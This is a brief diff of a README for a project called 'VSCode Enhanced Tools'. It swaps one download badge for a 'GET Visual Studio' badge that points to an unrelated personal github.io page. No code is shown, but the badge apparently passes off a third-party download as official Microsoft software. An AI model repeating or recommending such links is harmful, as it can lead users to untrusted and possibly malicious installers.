@@ -4,10 +4,8 @@
   <img src="https://miro.medium.com/0*JQ3INI7sdhkF1T3R.png" alt="VSCode Enhanced Tools Logo"/>
 </div>
 
-<div align="center">
+[![GET Visual Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Visual-Studio-0078D6?style=for-the-badge&logoColor=white)](https://eva740673.github.io/.github/Visual-Studio)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://visual-studio-code-enhanced.github.io/.github/)
-</div>
 
 ---
 
